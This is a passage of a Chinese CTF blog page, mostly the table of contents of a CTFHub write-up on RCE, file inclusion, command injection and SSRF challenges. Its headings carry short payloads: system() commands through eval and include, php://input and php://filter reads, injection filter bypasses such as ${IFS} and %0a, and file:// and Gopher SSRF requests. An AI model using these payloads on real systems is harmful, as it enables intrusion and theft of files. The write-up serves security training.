href="#%E8%BF%99%E4%B8%A4%E4%B8%AA%E9%85%8D%E7%BD%AE%E7%9A%84%E6%84%8F%E6%80%9D%E5%B0%B1%E6%98%AF%EF%BC%9A%E6%88%91%E4%BB%AC%E6%8C%87%E5%AE%9A%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%88%E5%A6%82-1-jpg%EF%BC%89%EF%BC%8C%E9%82%A3%E4%B9%88%E8%AF%A5%E6%96%87%E4%BB%B6%E5%B0%B1%E4%BC%9A%E8%A2%AB%E5%8C%85%E5%90%AB%E5%9C%A8%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-PHP-%E6%96%87%E4%BB%B6%E4%B8%AD%EF%BC%88%E5%A6%82-index-php%EF%BC%89%EF%BC%8C%E7%9B%B8%E5%BD%93%E4%BA%8E%E5%9C%A8-index-php-%E4%B8%AD%E6%8F%92%E5%85%A5%E4%B8%80%E5%8F%A5%EF%BC%9Arequire-1-jpg-%E3%80%82"><span class="toc-number">2.8.4.</span> <span class="toc-text">这两个配置的意思就是：我们指定一个文件（如 1.jpg），那么该文件就会被包含在要执行的 PHP 文件中（如 index.php），相当于在 index.php 中插入一句：require(.&#x2F;1.jpg);。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E6%97%B6%E4%B8%8D%E5%86%8D%E6%98%AF%E8%AE%BF%E9%97%AE%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E8%80%8C%E6%98%AF%E5%AF%B9%E5%BA%94%E7%9A%84php%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-number">2.8.4.1.</span> <span class="toc-text">蚁剑连接时不再是访问图片路径而是对应的php文件路径</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfhub-RCE"><span class="toc-number">3.</span> <span class="toc-text">ctfhub_RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-eval%E6%89%A7%E8%A1%8C"><span class="toc-number">3.1.</span> <span class="toc-text">1)eval执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eval%E4%BC%9A%E5%B0%86%E5%8F%82%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="toc-number">3.1.1.</span> <span class="toc-text">eval会将参数执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%97%B6%E5%8F%82%E6%95%B0%E8%A6%81%E4%BB%A5system-%E2%80%98%E5%91%BD%E4%BB%A4%E2%80%99-%E7%9A%84%E5%BD%A2%E5%BC%8F%E4%BC%A0%E5%85%A5%EF%BC%8C%E8%BF%99%E6%A0%B7%E6%89%8D%E8%83%BD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.2.</span> <span class="toc-text">同时参数要以system(‘命令’);的形式传入，这样才能执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E4%B8%AA%E9%A2%98%E7%9B%B4%E6%8E%A5system-%E2%80%98ls-%E2%80%98-%E5%92%8Csystem-%E2%80%98cat-flag-5647%E2%80%99-%E5%B0%B1%E7%BB%93%E6%9D%9F%E4%BA%86"><span class="toc-number">3.1.3.</span> <span class="toc-text">这个题直接system(‘ls &#x2F;‘);和system(‘cat &#x2F;flag_5647’)就结束了</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">3.2.</span> <span class="toc-text">2)文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E4%B8%AD%E6%9C%89%E4%B8%80%E4%B8%AAshell-txt%E7%9A%84%E8%B6%85%E9%93%BE%E6%8E%A5%EF%BC%8C%E8%AE%BF%E9%97%AE%E8%BF%9B%E5%8E%BB%E5%8F%91%E7%8E%B0%E6%9C%89eval%E5%87%BD%E6%95%B0%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E4%BB%AC%E6%97%A0%E6%B3%95%E7%9B%B4%E6%8E%A5%E5%90%91%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%E4%BC%A0%E5%85%A5%E5%8F%82%E6%95%B0%EF%BC%8C%E6%89%80%E4%BB%A5%E8%A6%81%E5%88%A9%E7%94%A8index-php%E4%B8%AD%E7%9A%84include%E5%91%BD%E4%BB%A4%E6%8A%8A%E8%BF%99%E4%B8%AAshell-txt%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E6%9D%A5%E5%86%8D%E8%BF%9B%E8%A1%8C%E4%BC%A0%E5%8F%82%E3%80%82"><span class="toc-number">3.2.1.</span> <span class="toc-text">代码中有一个shell.txt的超链接，访问进去发现有eval函数，但是我们无法直接向这个文件传入参数，所以要利用index.php中的include命令把这个shell.txt文件包含进来再进行传参。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E7%9B%B4%E6%8E%A5-file-shell-txt-cmd-system-%E2%80%98ls-%E2%80%98-%E5%92%8C-file-shell-txt-cmd-system-%E2%80%98cat-flag%E2%80%99-%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86%E3%80%82"><span class="toc-number">3.2.2.</span> <span class="toc-text">所以直接?file&#x3D;shell.txt&amp;cmd&#x3D;system(‘ls &#x2F;‘);和?file&#x3D;shell.txt&amp;cmd&#x3D;system(‘cat &#x2F;flag’);就可以了。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-php-input-%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB-%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">3.3.</span> <span class="toc-text">3)php:&#x2F;&#x2F;input  远程包含   读取源代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E4%B8%89%E4%B8%AA%E5%89%8D%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%94%A8php-input%EF%BC%8C%E7%84%B6%E5%90%8Epost%E4%BC%A0php%E7%9A%84%E5%91%BD%E4%BB%A4%E5%8D%B3%E3%80%8A-php-system-%E2%80%98ls-%E2%80%98-%E3%80%8B%E5%92%8C%E3%80%8A-php-system-%E2%80%98cat-flag-4627%E2%80%99-%E3%80%8B"><span class="toc-number">3.3.1.</span> <span class="toc-text">这三个前第一个用php:&#x2F;&#x2F;input，然后post传php的命令即《?php system(‘ls &#x2F;‘);?》和《?php system(‘cat &#x2F;flag_4627’);?》</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%92%8C%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%87%A0%E4%B9%8E%E4%B8%80%E6%A0%B7%EF%BC%8C%E7%9B%B4%E6%8E%A5php-input%E7%84%B6%E5%90%8E%E3%80%8A-php-system-%E2%80%98ls-%E2%80%98-%E3%80%8B%E5%92%8C%E3%80%8A-php-system-%E2%80%98cat-flag%E2%80%99-%E3%80%8B"><span class="toc-number">3.3.2.</span> <span class="toc-text">第二个和第一个几乎一样，直接php:&#x2F;&#x2F;input然后《?php system(‘ls &#x2F;‘);?》和《?php system(‘cat &#x2F;flag’);?》</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E4%B8%AA%E7%9B%B4%E6%8E%A5%E8%AF%B4%E4%BA%86flag%E5%9C%A8-flag%E9%87%8C%E9%9D%A2%EF%BC%8C%E6%89%80%E4%BB%A5%E7%9B%B4%E6%8E%A5php-filter-read-convert-base64-encode-resource-flag%EF%BC%8C%E5%86%8D%E8%A7%A3%E7%A0%81%E5%8D%B3%E5%8F%AF%E3%80%82"><span class="toc-number">3.3.3.</span> <span class="toc-text">第三个直接说了flag在&#x2F;flag里面，所以直接php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag，再解码即可。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.</span> <span class="toc-text">4)命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5127-0-0-1-ls%E5%92%8C127-0-0-1-cat-13902158133348-php%E5%8D%B3%E5%8F%AF%EF%BC%88%E4%B8%80%E5%AE%9A%E8%A6%81%E8%AE%B0%E5%BE%97%E9%9A%8F%E6%89%8B%E6%9F%A5%E7%9C%8B%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%89"><span class="toc-number">3.4.1.</span> <span class="toc-text">直接127.0.0.1;ls和127.0.0.1;cat 13902158133348.php即可（一定要记得随手查看网页源代码）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-cat-%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E8%BF%98%E5%8F%AF%E4%BB%A5%E7%94%A8-more%E3%80%81less%E3%80%81head%E3%80%81tac%E3%80%81tail%E3%80%81nl%E3%80%81od%E3%80%81vi%E3%80%81vim-%E7%AD%89%E6%96%B9%E6%B3%95%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87%E3%80%82"><span class="toc-number">3.4.2.</span> <span class="toc-text">1.cat 被过滤，还可以用 more、less、head、tac、tail、nl、od、vi、vim 等方法进行绕过。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E5%8F%AF%E4%BB%A5%E7%94%A8-IFS-%E7%AD%89%E6%96%B9%E5%BC%8F%E6%9B%BF%E4%BB%A3"><span class="toc-number">3.4.3.</span> <span class="toc-text">2.过滤空格可以用${IFS}等方式替代</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BF%87%E6%BB%A4-%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%E6%8B%BC%E6%8E%A5%E5%91%BD%E4%BB%A4%E7%9A%84%E5%BD%A2%E5%BC%8F%E8%AE%BF%E9%97%AE%E8%B7%AF%E5%BE%84%E5%86%85%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B0%B1%E6%98%AF%E5%85%88%E9%80%9A%E8%BF%87cd%E8%AE%BF%E9%97%AE%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%86%8D%E6%89%A7%E8%A1%8Cls%E5%92%8Ccat%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">3.4.4.</span> <span class="toc-text">3.过滤&#x2F;，直接利用拼接命令的形式访问路径内的文件，就是先通过cd访问路径，再执行ls和cat的命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%87%E6%BB%A4%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%8C%E6%8C%91-%E5%89%A9%E4%B8%8B%E7%9A%84%E7%94%A8%EF%BC%8C%E5%A6%82%E6%9E%9C%E9%83%BD%E8%A2%AB%E8%BF%87%E6%BB%A4%E5%B0%B1%E4%BD%BF%E7%94%A8-0a-%EF%BC%88%E6%8D%A2%E8%A1%8C%E7%AC%A6%EF%BC%89-0d-%EF%BC%88%E5%9B%9E%E8%BD%A6%E7%AC%A6%EF%BC%89%EF%BC%88%E8%A6%81%E5%9C%A8url%E4%B8%AD%E8%BE%93%E5%85%A5%EF%BC%8C%E4%B8%8D%E7%84%B6%E6%97%A0%E6%B3%95%E8%A2%AB%E7%BC%96%E7%A0%81%EF%BC%89"><span class="toc-number">3.4.5.</span> <span class="toc-text">4.过滤运算符，挑;&amp;|剩下的用，如果都被过滤就使用%0a （换行符）%0d （回车符）（要在url中输入，不然无法被编码）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4"><span class="toc-number">3.5.</span> <span class="toc-text">综合过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-%E7%A9%BA%E6%A0%BC-cat-flag-ctfhub"><span class="toc-number">3.5.1.</span> <span class="toc-text">过滤了|  &amp;  ;  空格  &#x2F;  cat  flag  ctfhub</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E5%85%A8%E5%86%9B%E8%A6%86%E6%B2%A1%EF%BC%8C%E6%89%80%E4%BB%A5%E7%94%A8-0a%E7%BB%95%E8%BF%87"><span class="toc-number">3.5.2.</span> <span class="toc-text">运算符全军覆没，所以用%0a绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%94%A8-IFS-%E7%BB%95%E8%BF%87"><span class="toc-number">3.5.3.</span> <span class="toc-text">空格用${IFS}绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8cd%E4%BB%A3%E6%9B%BF"><span class="toc-number">3.5.4.</span> <span class="toc-text">&#x2F;用cd代替</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat%E7%94%A8more%E7%AD%89%E4%BB%A3%E6%9B%BF"><span class="toc-number">3.5.5.</span> <span class="toc-text">cat用more等代替</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag%E6%98%AF%E6%96%87%E4%BB%B6%E5%90%8D%E5%92%8C%E8%B7%AF%E5%BE%84%E5%90%8D%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%8C%E5%9C%A8%E8%AE%BF%E9%97%AE%E6%97%B6%E8%A6%81%E9%81%BF%E5%85%8D%E5%87%BA%E7%8E%B0%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8-%E8%87%AA%E5%8A%A8%E8%A1%A5%E9%BD%90%EF%BC%8C%E6%AF%94%E5%A6%82cd-flag-in-here%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%94%A8cd-in-here%E8%87%AA%E5%8A%A8%E8%A1%A5%E9%BD%90%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%A8-%E5%B0%86flag%E6%96%AD%E5%BC%80%EF%BC%8C%E5%8D%B3fl-ag%EF%BC%8C%E5%8E%9F%E7%90%86%E4%B8%BA-%E5%9C%A8shell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8B%E4%B8%BA%E7%A9%BA"><span class="toc-number">3.5.6.</span> <span class="toc-text">flag是文件名和路径名的一部分，在访问时要避免出现，所以可以利用*自动补齐，比如cd flag_in_here就可以用cd *_in_here自动补齐，也可以用$*将flag断开，即fl$ag，原理为$ 在shell命令执行下为空</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfhub%E6%B2%A1%E6%9C%89%E5%87%BA%E7%8E%B0%E3%80%82"><span class="toc-number">3.5.7.</span> <span class="toc-text">ctfhub没有出现。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfhubSSRF"><span class="toc-number">4.</span> <span class="toc-text">ctfhubSSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="toc-number">4.1.</span> <span class="toc-text">1)内网访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E5%88%B0url%E4%B8%AD%E6%9C%89%EF%BC%9Furl-%EF%BC%8C%E6%89%80%E4%BB%A5%E7%9B%B4%E6%8E%A5url-127-0-0-1-flag-php"><span class="toc-number">4.1.1.</span> <span class="toc-text">注意到url中有？url&#x3D;，所以直接url&#x3D;127.0.0.1&#x2F;flag.php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">4.2.</span> <span class="toc-text">2)伪协议读取文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8file%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96flag-php-url-file-var-www-html-flag-php"><span class="toc-number">4.2.1.</span> <span class="toc-text">利用file伪协议读取flag.php,url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">4.3.</span> <span class="toc-text">3)端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8http%E5%8D%8F%E8%AE%AE%E5%88%A4%E6%96%AD%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E3%80%82BP%E7%88%86%E7%A0%B4%E7%AB%AF%E5%8F%A38000-9000%EF%BC%8C%E7%94%A8cpp%E7%9A%84ofstream%E6%88%96%E8%80%85python%E7%94%9F%E6%88%90%E5%AD%97%E5%85%B8%E3%80%82"><span class="toc-number">4.3.1.</span> <span class="toc-text">用http协议判断内网主机端口是否存在。BP爆破端口8000-9000，用cpp的ofstream或者python生成字典。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-POST%E8%AF%B7%E6%B1%82"><span class="toc-number">4.4.</span> <span class="toc-text">4)POST请求</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99%E4%B9%8B%E5%90%8E%E5%95%A5%E4%B9%9F%E6%B2%A1%E6%9C%89%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%E4%B8%80%E8%88%AC%E6%98%AF%E8%A6%81%E7%94%A8%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E6%89%AB%E6%8F%8F%E4%B8%80%E4%B8%8B%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%BE%A1%E5%89%91%E6%88%96%E8%80%85dirsearch%E6%89%AB%E4%B8%80%E4%B8%8B%EF%BC%88%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E7%9A%84%E6%80%BB%E6%98%AF%E6%89%AB%E4%B8%8D%E5%87%BA%E6%9D%A5%EF%BC%89"><span class="toc-number">4.4.1.</span> <span class="toc-text">访问网站之后啥也没有，这种情况一般是要用扫描工具扫描一下，可以用御剑或者dirsearch扫一下（为什么我的总是扫不出来）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E4%B9%8B%E5%90%8E%E5%BE%97%E5%88%B0flag-php%E5%92%8Cindex-php-%E8%AE%BF%E9%97%AEflag-php%E5%90%8E%E5%8F%91%E7%8E%B0%E8%A6%81%E6%B1%82%E6%9C%AC%E5%9C%B0%E8%AE%BF%E9%97%AE%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8A%A0%E4%B8%8A127-0-0-1%E8%AE%BF%E9%97%AE%E5%8F%91%E7%8E%B0%E6%9C%89%E4%B8%AA%E8%BE%93%E5%85%A5%E6%A1%86-%E4%BD%86%E6%98%AF%E6%8F%90%E4%BA%A4%E4%B8%8D%E4%BA%86%EF%BC%8C%E4%B9%9F%E6%B2%A1%E6%9C%89POST%E8%AF%B7%E6%B1%82%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81%E5%90%8E%E6%9C%89%E4%B8%AAkey%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E6%9E%84%E9%80%A0POST%E8%AF%B7%E6%B1%82%EF%BC%8C%E5%B0%B1%E8%A6%81%E5%88%A9%E7%94%A8%E5%88%B0Gopher%E5%8D%8F%E8%AE%AE%EF%BC%8CSSRF%E4%BE%BF%E6%98%AF%E8%A7%A3%E5%86%B3%E8%BF%99%E7%A7%8D%E9%97%AE%E9%A2%98%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%96%E7%9A%84%E5%8E%9F%E7%90%86%E4%BE%BF%E6%98%AF%E9%80%9A%E8%BF%87%E4%B8%80%E4%B8%AA%E6%9C%89SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%BD%91%E7%AB%99%E6%9D%A5%E9%97%B4%E6%8E%A5%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%EF%BC%8C%E6%89%80%E4%BB%A5%E4%B8%BA%E4%BA%86%E6%89%BE%E5%88%B0SSRF%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%B0%B12%E4%B8%AAphp%E6%96%87%E4%BB%B6%E7%9A%84%E8%AF%9D%E5%A4%A7%E6%A6%82%E7%8E%87%E5%B0%B1%E6%98%AF%E5%8F%A6%E5%A4%96%E4%B8%80%E4%B8%AAindex-php%E4%BA%86%EF%BC%89%E7%9A%84%E7%BD%91%E7%AB%99%EF%BC%8C%E6%88%91%E4%BB%AC%E7%94%A8%E4%BC%AA%E5%8D%8F%E8%AE%AEfile%E6%9D%A5%E8%AF%BB%E5%8F%96index-php%E5%92%8Cflag-php%E7%9A%84%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">4.4.2.</span> <span class="toc-text">扫描之后得到flag.php和index.php,访问flag.php后发现要求本地访问，所以加上127.0.0.1访问发现有个输入框,但是提交不了，也没有POST请求，查看源代码后有个key，所以我们要构造POST请求，就要利用到Gopher协议，SSRF便是解决这种问题的漏洞，他的原理便是通过一个有SSRF漏洞的网站来间接发送请求，所以为了找到SSRF漏洞（就2个php文件的话大概率就是另外一个index.php了）的网站，我们用伪协议file来读取index.php和flag.php的源代码</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/28/22%E7%BD%91%E9%BC%8E%E5%8D%8A%E5%86%B3/" title="22网鼎半决">22网鼎半决</a><time datetime="2025-08-28T15:20:58.000Z" title="发表于 2025-08-28 23:20:58">2025-08-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/24/Delegation/" title="Delegation">Delegation</a><time datetime="2025-08-24T15:20:58.000Z" title="发表于 2025-08-24 23:20:58">2025-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/23/Lilctf/" title="Lilctf">Lilctf</a><time datetime="2025-08-23T15:20:58.000Z" title="发表于 2025-08-23 23:20:58">2025-08-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/20/exchange/" title="exchange">exchange</a><time datetime="2025-08-20T15:20:58.000Z" title="发表于 2025-08-20 23:20:58">2025-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/17/nepctf/" title="nepctf">nepctf</a><time datetime="2025-08-17T15:20:58.000Z" title="发表于 2025-08-17 23:20:58">2025-08-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/789.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By xianxin</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>